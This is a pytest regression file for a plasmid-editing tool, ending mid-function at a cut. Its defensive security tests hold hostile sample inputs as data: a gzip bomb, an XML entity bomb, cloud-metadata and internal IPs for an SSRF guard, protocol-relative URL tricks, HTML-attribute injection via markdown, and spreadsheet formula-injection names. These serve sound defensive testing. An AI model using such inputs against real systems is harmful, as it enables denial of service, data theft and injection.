"""Regression tests for the 2026-09-22 deep audit.

Each test asserts against something OUTSIDE the code under test wherever
possible — a brute-force answer, a Biopython parse of the file SpliceCraft
wrote, the bases underneath a feature — because the defects this audit found
were all self-consistent from the inside.
"""
from __future__ import annotations

import copy
from pathlib import Path

import pytest

import splicecraft as sc
import splicecraft_fileio as _fileio

_TESTS = Path(__file__).parent


# ── D1: launch-time id backfill must never create duplicate ids ────────────

def _entry(name, id_, added=""):
    return {"name": name, "id": id_, "added": added, "gb_text": ""}


class TestIdBackfillNeverSteals:
    def test_a_correctly_bumped_id_is_not_upgraded_onto_an_owner(self):
        # A new import lands at index 0 (the library is newest-first) with a
        # correctly disambiguated id. The walk used to hand it the BARE id,
        # while the established entry kept it too — two entries, one id.
        lib = [_entry("pcDNA3.1(-)", "pcDNA3_1_2", "2026-09-01"),
               _entry("pcDNA3.1(+)", "pcDNA3_1", "2026-01-01")]
        out, n = sc._backfill_library_ids_match_names(copy.deepcopy(lib))
        assert [e["id"] for e in out] == ["pcDNA3_1_2", "pcDNA3_1"]
        assert n == 0

    def test_an_already_persisted_duplicate_is_resolved_oldest_keeps(self):
        lib = [_entry("pcDNA3.1(-)", "pcDNA3_1", "2026-09-01"),
               _entry("pcDNA3.1(+)", "pcDNA3_1", "2026-01-01")]
        out, _ = sc._backfill_library_ids_match_names(copy.deepcopy(lib))
        ids = {e["name"]: e["id"] for e in out}
        assert ids["pcDNA3.1(+)"] == "pcDNA3_1"      # the older owner
        assert ids["pcDNA3.1(-)"] == "pcDNA3_1_2"
        assert len({e["id"] for e in out}) == 2

    def test_a_legacy_id_avoids_every_id_in_use_and_is_idempotent(self):
        lib = [_entry("Foo", "legacy9", "2026-05-01"),
               _entry("Foo", "Foo", "2026-01-01"),
               _entry("DEMO 34", "X1"), _entry("DEMO-34", "X2")]
        out, _ = sc._backfill_library_ids_match_names(copy.deepcopy(lib))
        ids = [e["id"] for e in out]
        assert len(ids) == len(set(ids))
        assert ids[1] == "Foo"                      # the owner kept its id
        again, n = sc._backfill_library_ids_match_names(copy.deepcopy(out))
        assert [e["id"] for e in again] == ids and n == 0


# ── D2: .dna export must never splice a stale import sidecar ───────────────

def _circ_record(seq):
    from Bio.Seq import Seq
    from Bio.SeqRecord import SeqRecord
    return SeqRecord(Seq(seq), id="pX", name="pX", description="pX",
                     annotations={"molecule_type": "DNA",
                                  "topology": "circular"})


class TestDnaExportUsesCurrentEntry:
    def test_an_edited_entry_exports_its_edit_not_the_import(self, tmp_path):
        orig = "ATGAAACCCGGGTTTTAG" * 20
        edited = orig[:100] + "GAATTC" + orig[100:]
        sc._save_dna_original(
            "pX", sc._write_commercialsaas_dna_bytes(_circ_record(orig)))
        entry = {"id": "pX", "name": "pX",
                 "gb_text": sc._record_to_gb_text(_circ_record(edited))}
        out = tmp_path / "pX.dna"
        sc._export_commercialsaas_dna(entry, out)
        got = str(sc.load_genbank(str(out)).seq).upper()
        assert got == edited.upper()

    def test_an_unedited_real_import_still_splices_byte_exact(self, tmp_path):
        src = _TESTS / "FFE 1 ENTRY UPD.dna"
        raw = src.read_bytes()
        entry = {"id": "ffe1", "name": "FFE 1",
                 "gb_text": sc._record_to_gb_text(sc.load_genbank(str(src)))}
        assert _fileio._dna_sidecar_matches_entry(raw, entry)
        sc._save_dna_original("ffe1", raw)
        out = tmp_path / "ffe1.dna"
        sc._export_commercialsaas_dna(entry, out)
        assert out.read_bytes() == sc._inject_commercialsaas_history(raw, None)

    def test_a_renamed_feature_counts_as_an_edit(self):
        src = _TESTS / "FFE 1 ENTRY UPD.dna"
        raw = src.read_bytes()
        rec = sc.load_genbank(str(src))
        feat = next(f for f in rec.features if f.type != "source")
        feat.qualifiers["label"] = ["renamed after import"]
        entry = {"id": "ffe1", "gb_text": sc._record_to_gb_text(rec)}
        assert not _fileio._dna_sidecar_matches_entry(raw, entry)


# ── D6/D7: Settings → Restore from backup ──────────────────────────────────

class TestRestoreFromBackupResolvesAndReadsGzip:
    @pytest.mark.parametrize(
        "label,attr", sc.RestoreFromBackupModal._TARGETS)
    def test_every_restore_target_resolves_to_a_path(self, label, attr):
        # The modal did `getattr(<hub module>, attr)`, but the data paths
        # moved to `_state` — every target read "Could not resolve".
        class _Sel:
            value = attr
        modal = sc.RestoreFromBackupModal.__new__(sc.RestoreFromBackupModal)
        modal.query_one = lambda *a, **k: _Sel()          # type: ignore[method-assign]
        assert isinstance(modal._current_target_path(), Path), label

    def test_a_gzipped_generation_lists_and_restores(self, tmp_path):
        import gzip
        import json
        target = sc._state._LIBRARY_FILE
        good = {"_schema_version": 1,
                "entries": [{"id": "a", "name": "a", "gb_text": ""},
                            {"id": "b", "name": "b", "gb_text": ""}]}
        gz = target.with_name(target.name + ".bak.20260101-000000.gz")
        gz.parent.mkdir(parents=True, exist_ok=True)
        with gzip.open(gz, "wb") as fh:
            fh.write(json.dumps(good).encode("utf-8"))
        info = sc._backup_info(gz)
        assert info is not None and info.get("n_entries") == 2, info
        listed = sc._list_recoverable_backups(target)     # must not raise
        assert any(Path(b["source_path"]) == gz for b in listed)
        assert sc._restore_from_backup(target, gz, "Plasmid library") == 2

    def test_a_gzip_bomb_is_refused_not_expanded(self, tmp_path, monkeypatch):
        import gzip
        monkeypatch.setattr(sc._state, "_SAFE_LOAD_JSON_MAX_BYTES", 1000)
        bomb = tmp_path / "x.json.bak.20260101-000000.gz"
        with gzip.open(bomb, "wb") as fh:
            fh.write(b"[" + b"0," * 5000 + b"0]")
        with pytest.raises(OSError):
            sc._read_backup_bytes(bomb)


# ── D8: the diagnostic bundle must not carry credentials ───────────────────

def test_diagnostic_bundle_redacts_secret_settings(tmp_path):
    import json
    import zipfile
    secret = "s3cr3t-DO-NOT-SHIP"
    sc._state._SETTINGS_FILE.parent.mkdir(parents=True, exist_ok=True)
    sc._state._SETTINGS_FILE.write_text(json.dumps({
        "plasmidsaurus_client_secret": secret,
        "brave_search_api_key": secret + "2",
        "theme": "dark"}), encoding="utf-8")
    out = sc._create_diagnostic_bundle(tmp_path / "bundle.zip")
    with zipfile.ZipFile(out) as zf:
        blob = b"".join(zf.read(n) for n in zf.namelist())
        settings = json.loads(zf.read("settings.json"))
    assert secret.encode() not in blob
    assert settings["plasmidsaurus_client_secret"] == "<redacted>"
    assert settings["theme"] == "dark"


# ── D4/D14: the active-collection switch ───────────────────────────────────

def _coll(name, ids):
    return {"name": name,
            "plasmids": [{"id": i, "name": i, "gb_text": ""} for i in ids]}


class TestActivateCollection:
    def _ids(self, coll_name):
        for c in sc._load_collections():
            if c.get("name") == coll_name:
                return [p["id"] for p in c.get("plasmids") or []]
        return None

    def test_a_pending_library_change_is_written_through_before_switching(self):
        # add_entry reseats the cache and persists from a worker; a switch a
        # moment later replaced the cache first and the plasmid was lost.
        sc._save_collections([_coll("A", ["a1"]), _coll("B", ["b1"])])
        sc._activate_collection("A")
        sc._state._library_cache = [
            {"id": "a2", "name": "a2", "gb_text": ""},
            {"id": "a1", "name": "a1", "gb_text": ""}]       # not yet on disk
        sc._activate_collection("B")
        assert self._ids("A") == ["a2", "a1"]
        assert [e["id"] for e in sc._load_library()] == ["b1"]
        assert sc._get_active_collection_name() == "B"

    def test_a_failed_write_through_refuses_the_switch_and_moves_nothing(
            self, monkeypatch):
        sc._save_collections([_coll("A", ["a1"]), _coll("B", ["b1"])])
        sc._activate_collection("A")
        sc._state._library_cache = [
            {"id": "a2", "name": "a2", "gb_text": ""},
            {"id": "a1", "name": "a1", "gb_text": ""}]

        def _boom(*a, **k):
            raise OSError("disk full")
        monkeypatch.setattr(sc, "_save_library", _boom)
        with pytest.raises(RuntimeError, match="could not be saved"):
            sc._activate_collection("B")
        assert sc._get_active_collection_name() == "A"
        assert [e["id"] for e in sc._state._library_cache] == ["a2", "a1"]
        assert self._ids("B") == ["b1"]

    def test_activation_fills_a_newly_created_empty_collection(self):
        # `_create_genbank_collection` saves the collection EMPTY and relied
        # on the old re-mirror to fill it; the new switch must do the same.
        sc._save_collections([_coll("A", ["a1"]), _coll("New", [])])
        sc._activate_collection("A")
        sc._activate_collection(
            "New", [{"id": "n1", "name": "n1", "gb_text": ""}])
        assert self._ids("New") == ["n1"]
        assert [e["id"] for e in sc._load_library()] == ["n1"]
        assert self._ids("A") == ["a1"]


# ── D5: primer / parts-bin / notebook mirrors get the dirty-marker protocol ─

class TestContainerMirrorDirtyMarker:
    def _fail_bin_mirror(self, monkeypatch):
        real = sc._save_parts_bin_collections

        def _boom(*a, **k):
            raise OSError("disk full")
        monkeypatch.setattr(sc, "_save_parts_bin_collections", _boom)
        sc._save_parts_bin([{"name": "p1"}, {"name": "p2-NEW"}])
        monkeypatch.setattr(sc, "_save_parts_bin_collections", real)

    def _setup(self):
        sc._save_parts_bin_collections([
            {"name": "Bin", "parts": [{"name": "p1"}]},
            {"name": "Other", "parts": [{"name": "o1"}]}])
        sc._set_active_parts_bin_name("Bin")
        sc._save_parts_bin([{"name": "p1"}])

    def test_a_failed_parts_mirror_is_not_reverted_at_the_next_launch(
            self, monkeypatch):
        self._setup()
        self._fail_bin_mirror(monkeypatch)
        assert sc._mirror_is_dirty("parts_bin")
        sc._state._parts_bin_cache = None
        sc._restore_parts_bin_from_active_bin()          # what launch runs
        assert [p["name"] for p in sc._load_parts_bin()] == ["p1", "p2-NEW"]

    def test_a_switch_pushes_unmirrored_parts_into_the_outgoing_bin(
            self, monkeypatch):
        self._setup()
        self._fail_bin_mirror(monkeypatch)
        assert sc._switch_active_parts_bin("Other")
        bins = {b["name"]: [p["name"] for p in b.get("parts") or []]
                for b in sc._load_parts_bin_collections()}
        assert bins["Bin"] == ["p1", "p2-NEW"]
        assert [p["name"] for p in sc._load_parts_bin()] == ["o1"]
        assert not sc._mirror_is_dirty("parts_bin")

    def test_a_switch_refuses_when_the_push_fails_again(self, monkeypatch):
        self._setup()
        self._fail_bin_mirror(monkeypatch)

        def _boom(*a, **k):
            raise OSError("still full")
        monkeypatch.setattr(sc, "_save_parts_bin_collections", _boom)
        with pytest.raises(RuntimeError, match="switch was cancelled"):
            sc._switch_active_parts_bin("Other")
        assert sc._get_active_parts_bin_name() == "Bin"
        assert [p["name"] for p in sc._load_parts_bin()] == ["p1", "p2-NEW"]


# ── FM1: a loader-invented id must never replace an unrelated entry ─────────

class TestImportIdentityFixup:
    def _lib_with(self, seq, id_):
        rec = _circ_record(seq)
        rec.id = id_
        entry = sc._record_to_library_entry(rec, Path(f"/tmp/{id_}.gb"))
        entry["id"] = id_
        sc._save_library([entry])

    def test_a_placeholder_id_is_rederived_from_the_display_name(self):
        rec = _circ_record("ACGT" * 10)
        rec.id = "."                       # Biopython's `VERSION .`
        rec._tui_display_name = "pLKO.1 puro"
        assert sc._import_identity_fixup(rec) == "pLKO_1_puro"

    def test_same_id_different_sequence_gets_its_own_id(self):
        self._lib_with("ACGT" * 30, "contig_1")          # clone_A.fasta
        rec = _circ_record("TTGCA" * 30)                  # clone_B.fasta
        rec.id = "contig_1"
        rec._tui_display_name = "clone_B"
        assert sc._import_identity_fixup(rec) == "clone_B"
        assert rec.id == "clone_B"

    def test_reimporting_the_same_plasmid_keeps_its_id(self):
        self._lib_with("ACGT" * 30, "pUC19")
        rec = _circ_record("acgt" * 30)
        rec.id = "pUC19"
        assert sc._import_identity_fixup(rec) is None
        assert rec.id == "pUC19"

    def test_two_records_in_one_batch_do_not_share_an_id(self):
        a, b = _circ_record("ACGT" * 10), _circ_record("GGCC" * 10)
        for r, nm in ((a, "c1"), (b, "c2")):
            r.id = "contig_1"
            r._tui_display_name = nm
        taken: set = set()
        sc._import_identity_fixup(a, taken=taken)
        taken.add(a.id)
        sc._import_identity_fixup(b, taken=taken)
        assert a.id != b.id


# ── AA2 / AA15: residue edits take real codes and refuse the rest ──────────

@pytest.mark.parametrize("code,letter", [
    ("D", "D"), ("d", "D"), ("Asp", "D"), ("LYS", "K"), ("trp", "W"),
    ("Tyr", "Y"), ("Ter", "*"), ("stop", "*"), ("*", "*"),
    ("abc", ""), ("As", ""), ("", ""), (None, "")])
def test_residue_codes_map_whole_codes_not_first_letters(code, letter):
    assert sc._residue_code_to_letter(code) == letter


# ── C1: one reading geometry — declared part order is reading order ────────

from Bio.Seq import Seq as _Seq                                     # noqa: E402
from Bio.SeqFeature import (CompoundLocation as _CL,                # noqa: E402
                            FeatureLocation as _FL, SeqFeature as _SF)
from Bio.SeqRecord import SeqRecord as _SR                          # noqa: E402


def _rand_dna(n, seed=5):
    import random
    rng = random.Random(seed)
    return "".join(rng.choice("ACGT") for _ in range(n))


def _spliced_gene_record(n=1200, strand=1):
    """A circular record with a 2-exon CDS whose protein has no internal
    stop, built so Biopython's extract() is the oracle."""
    import random
    rng = random.Random(11)
    codons = [c for c in (a + b + c for a in "ACGT" for b in "ACGT"
                          for c in "ACGT") if c not in ("TAA", "TAG", "TGA")]
    cds = "ATG" + "".join(rng.choice(codons) for _ in range(58)) + "TAA"
    e1, e2 = cds[:90], cds[90:]
    intron = "GTAAGT" + _rand_dna(50, 3) + "TTTCAG"
    body = e1 + intron + e2
    seq = list(_rand_dna(n, 9))
    start = 300
    seq[start:start + len(body)] = list(body)
    seq = "".join(seq)[:n]
    a0, a1 = start, start + len(e1)
    b0, b1 = a1 + len(intron), a1 + len(intron) + len(e2)
    if strand == -1:
        seq = str(_Seq(seq).reverse_complement())
        a0, a1, b0, b1 = n - b1, n - b0, n - a1, n - a0
        loc = _CL([_FL(b0, b1, -1), _FL(a0, a1, -1)])
    else:
        loc = _CL([_FL(a0, a1, 1), _FL(b0, b1, 1)])
    rec = _SR(_Seq(seq), id="g", name="g",
              annotations={"molecule_type": "DNA", "topology": "circular"})
    rec.features.append(_SF(loc, type="CDS", qualifiers={"label": ["geneA"]}))
    return rec


class TestReadingGeometry:
    def test_traversal_rules(self):
        t = sc._feature_traversal
        # legacy 2-part origin wrap: shape wins, either stored order
        assert t(_CL([_FL(0, 10, 1), _FL(90, 100, 1)]), 100)[:2] == (90, 10)
        assert t(_CL([_FL(90, 100, 1), _FL(0, 10, 1)]), 100)[:2] == (90, 10)
        # spliced gene whose transcript crosses the origin inside the intron
        s, e, parts = t(_CL([_FL(80, 90, 1), _FL(5, 20, 1)]), 100)
        assert (s, e) == (80, 20) and parts == [(80, 90), (5, 20)]
        # same, minus strand, stored in reading order
        s, e, parts = t(_CL([_FL(5, 20, -1), _FL(80, 90, -1)]), 100)
        assert (s, e) == (80, 20) and parts == [(80, 90), (5, 20)]
        # linear: no wrap, sorted outer bounds
        assert t(_CL([_FL(80, 90, 1), _FL(5, 20, 1)]), 100,
                 circular=False)[:2] == (5, 90)

    @pytest.mark.parametrize("strand", [1, -1])
    @pytest.mark.parametrize("new_origin", [360, 420, 470])   # exon1/intron/exon2
    def test_residue_edit_after_reorigin_changes_the_right_codon(
            self, strand, new_origin):
        rec = _spliced_gene_record(strand=strand)
        n = len(rec.seq)
        if strand == -1:
            new_origin = n - new_origin
        rot = sc._rotate_seq_record(rec, new_origin)
        feat = next(f for f in rot.features if f.type == "CDS")
        truth = str(feat.extract(rot.seq).translate())
        for residue in (1, 10, 31, 45, 58):
            want = "W" if truth[residue - 1] != "W" else "F"
            plan = sc._protein_edit_plan(rot, feat, residue, want)
            assert plan["wt_aa"] == truth[residue - 1]
            edited = sc._apply_protein_edit(rot, plan)
            ef = next(f for f in edited.features if f.type == "CDS")
            got = str(ef.extract(edited.seq).translate())
            diff = [i + 1 for i in range(len(truth)) if truth[i] != got[i]]
            assert diff == [residue] and got[residue - 1] == want

    @pytest.mark.parametrize("strand", [1, -1])
    def test_map_translation_matches_biopython_after_reorigin(self, strand):
        rec = _spliced_gene_record(strand=strand)
        rot = sc._rotate_seq_record(rec, 420 if strand == 1 else 780)
        truth = str(next(f for f in rot.features
                         if f.type == "CDS").extract(rot.seq).translate())
        pm = sc.PlasmidMap.__new__(sc.PlasmidMap)
        pm._n_flattened = pm._n_clamped = 0
        feats = sc.PlasmidMap._parse(pm, rot)
        cds = next(f for f in feats if f.get("type") == "CDS")
        aa, _l, _v = sc._cds_aa_list(str(rot.seq).upper(), cds)
        assert "".join(aa) == truth


# ── FM2/FM3/FM8: GFF3 order, phase and the origin convention ───────────────

def _gff(rows, n, circular=True):
    head = [f"##gff-version 3", f"##sequence-region s 1 {n}"]
    region = (f"s\tx\tregion\t1\t{n}\t.\t+\t.\tID=s"
              + (";Is_circular=true" if circular else ""))
    return "\n".join(head + [region] + ["\t".join(r) for r in rows]) + "\n"


class TestGff3ReadingOrder:
    def test_ncbi_style_ascending_minus_rows_read_3prime_exon_first(self):
        n = 1000
        rows = [("s", "x", "CDS", str(a), str(b), ".", "-", "0", "ID=c1")
                for a, b in ((101, 200), (301, 400), (501, 601))]
        parsed = sc._parse_gff3_text(_gff(rows, n))
        f = sc._gff3_features_to_biopython(parsed, n)[0]
        assert [(int(p.start), int(p.end)) for p in f.location.parts] == \
            [(500, 601), (300, 400), (100, 200)]

    def test_spec_origin_crossing_row_is_imported_as_a_wrap(self):
        n = 1000
        rows = [("s", "x", "gene", "900", "1100", ".", "+", ".", "ID=g1")]
        parsed = sc._parse_gff3_text(_gff(rows, n))
        f = sc._gff3_features_to_biopython(parsed, n)[0]
        assert [(int(p.start), int(p.end)) for p in f.location.parts] == \
            [(899, 1000), (0, 100)]

    def test_leading_partial_codon_phase_becomes_codon_start(self):
        n = 1000
        rows = [("s", "x", "CDS", "101", "400", ".", "+", "2", "ID=c1")]
        parsed = sc._parse_gff3_text(_gff(rows, n))
        f = sc._gff3_features_to_biopython(parsed, n)[0]
        assert f.qualifiers.get("codon_start") == ["3"]

    def test_three_exon_phases_follow_the_spec(self):
        rec = _SR(_Seq(_rand_dna(300)), id="s", name="s",
                  annotations={"molecule_type": "DNA", "topology": "linear"})
        rec.features.append(_SF(_CL([_FL(10, 20, 1), _FL(30, 40, 1),
                                     _FL(50, 60, 1)]), type="CDS"))
        text = sc._record_to_gff3(rec)
        phases = [ln.split("\t")[7] for ln in text.splitlines()
                  if "\tCDS\t" in ln]
        assert phases == ["0", "2", "1"]


# ── CL1: a bare region with internal sites must not be silently truncated ──

def test_bare_region_with_one_internal_site_of_each_enzyme_is_refused():
    body = (_rand_dna(400, 1) + "GAATTC" + _rand_dna(400, 2) + "GGATCC"
            + _rand_dna(400, 4))
    frag, err = sc._excise_pcr_insert(body, "EcoRI", "BamHI")
    assert frag is None and err and "inside the region" in err


# ── P1/P2: primer binding — both roles, ranked before capping ──────────────

def _brute_binding_sites(primer, top, circular, seed):
    """Every (strand, foot_start, ident) a 3'-seeded primer has, by brute
    force over every window in both roles — no matcher, no dedup."""
    L, n = len(primer), len(top)
    rc = sc._rc
    out = set()
    for foot in range(n if circular else n - L + 1):
        if circular:
            win = (top + top)[foot:foot + L]
        else:
            win = top[foot:foot + L]
        for strand, oriented in ((1, win), (-1, rc(win))):
            if oriented[-seed:] != primer[-seed:]:
                continue
            mm = sum(1 for a, b in zip(primer, oriented) if a != b)
            out.add((strand, foot, round(100.0 * (L - mm) / L, 6)))
    return out


class TestPrimerBindingRoles:
    def test_reverse_primer_with_a_palindromic_3_prime_seed_is_found(self):
        # The reverse primer's 3' seed is rc(top[800:812]); make that span a
        # palindrome (EcoRI twice) so seed == rc(seed).
        top = _rand_dna(800, 21) + "GAATTCGAATTC" + _rand_dna(1188, 22)
        rev = sc._rc(top[800:830])
        sites = sc._primer_binding_sites(rev, top, len(top), circular=True)
        assert sites, "no site at all"
        best = sites[0]
        assert (best["strand"], best["foot_start"], best["ident_pct"]) \
            == (-1, 800, 100.0)

    @pytest.mark.parametrize("circular", [True, False])
    def test_matches_brute_force_on_palindrome_rich_templates(self, circular):
        import random
        rng = random.Random(7)
        for trial in range(40):
            # Short palindromic blocks everywhere make seeds collide across
            # both roles; a 6-bp seed keeps the hit count interesting.
            blocks = [rng.choice(["GAATTC", "GGATCC", "AAGCTT", "ACGT",
                                  "".join(rng.choice("ACGT")
                                          for _ in range(5))])
                      for _ in range(60)]
            top = "".join(blocks)
            L = rng.randint(14, 24)
            foot = rng.randrange(0, len(top) - L)
            primer = top[foot:foot + L]
            if rng.random() < 0.5:
                primer = sc._rc(primer)
            got = sc._primer_binding_sites(primer, top, len(top),
                                           circular=circular, seed_len=6,
                                           max_sites=100_000)
            got_set = {(s["strand"], s["foot_start"],
                        round(s["ident_pct"], 6)) for s in got}
            assert got_set == _brute_binding_sites(primer, top, circular, 6), \
                f"trial {trial}"

    def test_best_site_survives_the_cap(self):
        # 30 weak copies of the seed BEFORE the one perfect site: capping in
        # scan order used to keep only weak sites.
        seed_site = "ACGTTGCAGGCT"
        weak = "".join(_rand_dna(18, 100 + i) + seed_site for i in range(30))
        perfect = _rand_dna(18, 999) + seed_site
        top = weak + perfect + _rand_dna(200, 5)
        primer = perfect
        sites = sc._primer_binding_sites(primer, top, len(top),
                                         circular=False, max_sites=5)
        assert len(sites) == 5
        assert sites[0]["ident_pct"] == 100.0
        assert sites[0]["foot_start"] == len(weak)


# ── SEC1: the web demo refuses every host-filesystem screen centrally ──────

_TREE_CTORS = ("DirectoryTree(", "_ExtensionAwareDirectoryTree(",
               "_FastaAwareDirectoryTree(", "_ZipAwareDirectoryTree(",
               "_AbiAwareDirectoryTree(", "_ImagePickerTree(")
# Screens that show a host directory tree but are safe in the web demo for a
# stated reason. Keep this list SHORT and justified.
_TREE_SCREENS_ALLOWED_UNFLAGGED = {
    # compose() omits the folder tree when _DEMO_MODE == "web", and the
    # caller refuses a folder import there too.
    "NewCollectionModal",
}


def test_every_directory_tree_screen_is_flagged_host_filesystem():
    import ast
    missing = []
    for fn in ("splicecraft.py", "splicecraft_modals.py"):
        src = (_TESTS.parent / fn).read_text(encoding="utf-8")
        for node in ast.parse(src).body:
            if not isinstance(node, ast.ClassDef):
                continue
            seg = ast.get_source_segment(src, node) or ""
            if not any(c in seg for c in _TREE_CTORS):
                continue
            if node.name.endswith("DirectoryTree") or node.name.endswith("Tree"):
                continue          # the tree widgets themselves
            flagged = any(
                isinstance(st, ast.Assign)
                and any(getattr(t, "id", "") == "_HOST_FILESYSTEM"
                        for t in st.targets)
                and getattr(st.value, "value", None) is True
                for st in node.body)
            if not flagged and node.name not in _TREE_SCREENS_ALLOWED_UNFLAGGED:
                missing.append(f"{fn}:{node.lineno} {node.name}")
    assert not missing, ("screens that browse the host filesystem must set "
                         "_HOST_FILESYSTEM = True (web-demo gate): "
                         + ", ".join(missing))


async def test_web_demo_refuses_every_host_filesystem_screen(monkeypatch):
    import splicecraft_modals as _modals
    monkeypatch.setattr(sc, "_DEMO_MODE", "web")
    app = sc.PlasmidApp()
    async with app.run_test(size=(160, 48)) as pilot:
        await pilot.pause()
        depth = len(app.screen_stack)
        for ctor in (sc.OpenFileModal, _modals.FastaFilePickerModal,
                     _modals.PrimerCsvImportModal,
                     _modals.MigrateImportPickerModal, sc.ImageAttachModal,
                     sc.ProteinSeqFilePickerModal):
            got = []
            app.push_screen(ctor(), callback=got.append)
            await pilot.pause()
            assert len(app.screen_stack) == depth, ctor.__name__
            assert got == [None], ctor.__name__
        # A NewCollectionModal still opens (empty collections are fine) but
        # shows no host directory tree.
        app.push_screen(sc.NewCollectionModal())
        await pilot.pause()
        assert not list(app.screen.query("DirectoryTree"))


# ── SEC2/SEC3/SEC7: network guard ──────────────────────────────────────────

class TestNetworkGuards:
    def test_percent_encoded_host_is_refused_before_resolving(self):
        import urllib.error
        import splicecraft_net as net
        with pytest.raises(urllib.error.URLError, match="percent-encoded"):
            net._assert_public_host("http://a%2eb.example.test/x")

    @pytest.mark.parametrize("ip", [
        "100.64.0.1", "100.100.100.200", "198.18.0.1", "192.0.0.8",
        "64:ff9b::a9fe:a9fe", "::ffff:100.100.100.200", "169.254.169.254",
        "::ffff:169.254.169.254", "127.0.0.1", "10.1.2.3"])
    def test_special_purpose_addresses_are_non_public(self, ip):
        import ipaddress
        import splicecraft_net as net
        assert net._ip_is_non_public(ipaddress.ip_address(ip))

    @pytest.mark.parametrize("ip", ["8.8.8.8", "93.184.216.34",
                                    "2606:4700::1111"])
    def test_public_addresses_stay_allowed(self, ip):
        import ipaddress
        import splicecraft_net as net
        assert not net._ip_is_non_public(ipaddress.ip_address(ip))

    def test_presigned_url_secrets_never_reach_a_log_line(self):
        url = ("https://bucket.s3.amazonaws.com/run.zip?X-Amz-Signature=abc123"
               "&X-Amz-Credential=AKIAXYZ%2F2026&X-Amz-Expires=600#frag")
        out = sc._redact_url_credentials(url)
        assert "abc123" not in out and "AKIAXYZ" not in out
        assert "X-Amz-Signature=REDACTED" in out
        assert out.startswith("https://bucket.s3.amazonaws.com/run.zip?")


# ── SEC5/SEC6: notebook HTML export ────────────────────────────────────────

def _html_elements(html):
    from html.parser import HTMLParser

    class _C(HTMLParser):
        def __init__(self):
            super().__init__(convert_charrefs=True)
            self.els = []

        def handle_starttag(self, tag, attrs):
            self.els.append((tag, dict(attrs)))

        handle_startendtag = handle_starttag
    c = _C()
    c.feed(html)
    c.close()
    return c.els


class TestNotebookHtmlExport:
    def test_a_link_nested_in_image_alt_cannot_add_attributes(self):
        import splicecraft_experiments as ex
        html = ex._markdown_subset_to_html("![p[q](x.png) r](data-probe=1)")
        for tag, attrs in _html_elements(html):
            allowed = {"img": {"src", "alt"}, "a": {"href", "rel"}}.get(tag)
            if allowed is not None:
                assert set(attrs) <= allowed, (tag, attrs)

    def test_url_query_ampersands_survive_one_decode(self):
        import splicecraft_experiments as ex
        url = "https://example.com/?a=1&b=2"
        els = _html_elements(ex._markdown_subset_to_html(f"[q]({url})"))
        assert [a["href"] for t, a in els if t == "a"] == [url]

    @pytest.mark.parametrize("u", ["/\\host/x.png", "\\/host/x.png",
                                   "/\t/host/x.png", "\\\\host\\x.png",
                                   "//host/x.png"])
    def test_every_protocol_relative_spelling_is_dropped(self, u):
        import splicecraft_experiments as ex
        assert ex._html_safe_url(u) == ""

    def test_a_run_of_brackets_exports_in_linear_time(self):
        import time
        import splicecraft_experiments as ex
        t0 = time.perf_counter()
        ex._markdown_subset_to_html("[" * 40_000 + "](x)")
        assert time.perf_counter() - t0 < 2.0


# ── SEC9: OT-2 protocol text is spliced in as real Python literals ─────────

def test_ot2_comment_and_metadata_literals_round_trip_as_python():
    import ast
    import splicecraft_opentrons as ot2
    text = "mix gently \U0001F600 \"quoted\" \\ back\tslash"
    plan = {
        "name": "prep \U0001F9EA", "pipette": "p300_single", "mount": "left",
        "tips": {"labware": "tiprack_300", "slot": 8},
        "labware": {"src": {"labware": "eppi_24", "slot": 1},
                    "dst": {"labware": "plate_24", "slot": 2}},
        "steps": [{"type": "comment", "text": text},
                  {"type": "pause", "message": True},
                  {"type": "transfer", "from": "src:A1", "to": "dst:A1",
                   "volume": 50}],
    }
    proto = ot2._ot2_compile_protocol(plan)
    tree = ast.parse(proto)                # valid Python at all
    calls = {}
    for node in ast.walk(tree):
        if (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
                and node.func.attr in ("comment", "pause") and node.args):
            calls[node.func.attr] = ast.literal_eval(node.args[0])
    assert calls["comment"] == text        # the emoji is ONE character again
    assert calls["pause"] == "True"        # a string, never a bare `true`
    meta = next(n for n in tree.body if isinstance(n, ast.Assign)
                and getattr(n.targets[0], "id", "") == "metadata")
    assert ast.literal_eval(meta.value)["protocolName"] == "prep \U0001F9EA"


# ── SEC8: history recovery parses .dna XML without expanding entities ──────

def test_history_node_count_refuses_a_dtd():
    bomb = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "aaaa">'
            '<!ENTITY b "&a;&a;&a;">]><HistoryTree><Node/>&b;</HistoryTree>')
    assert sc._history_node_count_of_xml(bomb) == 0
    assert sc._history_node_count_of_xml(
        "<HistoryTree><Node><Node/></Node></HistoryTree>") == 2


# ── P3/P4: one Tm model; degenerate oligos get a nearest-neighbour Tm ──────

class TestPrimerTm:
    def test_mutagenesis_and_check_primer_agree(self):
        import splicecraft_primer as pr
        pr._mut_thermo_cache_clear()
        for s in ("ATGCGTACGTTAGCCGATCGATCGGCTA", "GGATCCATGAAACGTTTTAGC",
                  "CCTTGGAAGGCTTAACGGCTAGCA"):
            assert abs(pr._mut_tm(s) - sc._primer_tm(s)) < 0.051, s

    def test_degenerate_oligo_is_bracketed_by_its_members(self):
        import itertools
        import primer3
        oligo = "ACGTACGTNCGTACGTRCGTA"
        members = ["".join(p) for p in itertools.product(
            *[{"N": "ACGT", "R": "AG"}.get(c, c) for c in oligo])]
        tms = [primer3.calc_tm(m) for m in members]
        lo, hi = sc._degenerate_tm_bracket(oligo)
        assert abs(lo - min(tms)) < 0.6 and abs(hi - max(tms)) < 0.6
        assert sc._primer_tm(oligo) == round(lo, 1)

    def test_plain_oligo_has_no_bracket(self):
        assert sc._degenerate_tm_bracket("ACGTACGTACGTACGTACGT") is None


# ── P6: order CSV cells can't become spreadsheet formulas ──────────────────

def test_primer_names_that_look_like_formulas_round_trip_as_text(tmp_path):
    import csv
    names = ["=HYPERLINK(\"http://x\")", "+SUM(A1)", "-10 box fwd", "@cmd",
             "plain name"]
    primers = [{"name": n, "sequence": s} for n, s in zip(
        names, ["ACGTACGTACGTACGTAC", "GGGTACGTACGTACGTAC",
                "TTTTACGTACGTACGTAC", "CCCTACGTACGTACGTAC",
                "AAAAACGTACGTACGTAC"])]
    out = tmp_path / "order.csv"
    sc._export_primers_to_csv(primers, out)
    with open(out, newline="") as fh:
        rows = list(csv.reader(fh))[1:]
    for row in rows:
        assert not row[0].startswith(("=", "+", "-", "@")), row[0]
    back = sc._import_primers_from_csv(out)["primers"]
    assert [p["name"] for p in back] == names


# ── L8/B3: DataTable cells show bracketed names as the text they are ──────

def test_datatable_cells_show_bracketed_names_literally():
